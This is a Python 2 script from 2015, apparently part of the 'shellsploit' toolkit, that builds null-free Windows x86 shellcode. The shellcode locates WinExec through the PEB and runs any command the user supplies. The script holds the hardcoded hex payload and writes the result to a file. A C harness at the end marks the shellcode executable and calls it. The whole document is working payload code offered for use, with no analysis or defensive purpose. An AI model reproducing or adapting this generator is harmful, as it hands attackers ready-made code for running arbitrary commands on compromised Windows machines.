#All Windows Null-Free WinExec Shellcode

"""
#Coded by B3mB4m
#Concat : b3mb4m@tuta.io
#Home   : b3mb4m.blogspot.com
#10.12.2015
Tested on :
	Windows XP/SP3 x86
	Windows 7 Ultimate x64
	Windows 8.1 Pro Build 9600 x64
	Windows 10 Home x64
-This shellcode NOT using GetProcAddress function-
-With this python script you can create ur own shellcode-
-This script belongs to shellsploit project-
-https://github.com/b3mb4m/Shellsploit-
"""



def WinExec( command, fill=None):
	from re import findall
	fill =  "31c9b957696e45eb0431c9eb0031c"
	fill += "031db31d231ff31f6648b7b308b7f0"
	fill += "c8b7f1c8b47088b77208b3f807e0c3"
	fill += "375f289c703783c8b577801c28b7a2"
	fill += "001c789dd81f957696e45753b8b34a"
	fill += "f01c645390e75f68b7a2401c7668b2"
	fill += "c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd"
	if len(command) == 4:
		stack = "%s" % (command.encode('hex'))
		data = findall("..?", stack)
		fill += "68"+"".join(data)
	else:
		if len(command)%4 == 3:
			padd = "\x20"
		elif len(command)%4 == 2:
			padd = "\x20"*2
		elif len(command)%4 == 1:
			padd = "\x20"*3
		else:
			padd = ""
		command = command + padd
		fixmesempai = findall('....?', command)
		for x in fixmesempai[::-1]:
			first = str(x[::-1].encode("hex"))
			second = findall("..?", first)[::-1]
			fill += "68"+"".join(second)
	fill += "89e2415152ffd7e886ffffff8b34af0"
	fill += "1c645813e4578697475f2817e045072"
	fill += "6f6375e98b7a2401c7668b2c6f8b7a1c"
	fill += "01c78b7caffc01c731c951ffd7"

	from random import randint
	name = str(randint(99999,99999999))+".txt"
	with open(name, "w") as exploit:
		exploit.write("\\x"+"\\x".join(findall("..?", fill)))
		exploit.close()

	print "\n\nLength : %s" % len(findall("..?", fill))
	print "File : %s\n" % name
	print "\n\\x"+"\\x".join(findall("..?", fill))


if __name__ == '__main__':
	from sys import argv
	if len(argv) < 2:
		print "\nUsage : python exploit.py 'command'\n"
	else:
		WinExec(argv[1])



"""
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

//gcc shell.c -o shell.exe

int main(void){
	char *shellcode = "SHELLCODE";
  	DWORD mypage;
  	BOOL ret = VirtualProtect (shellcode, strlen(shellcode),
    	PAGE_EXECUTE_READWRITE, &mypage);

  	if (!ret) {
    	printf ("VirtualProtect Failed ..\n");
    	return EXIT_FAILURE;}
  	printf("strlen(shellcode)=%d\n", strlen(shellcode));
  	((void (*)(void))shellcode)();
}
"""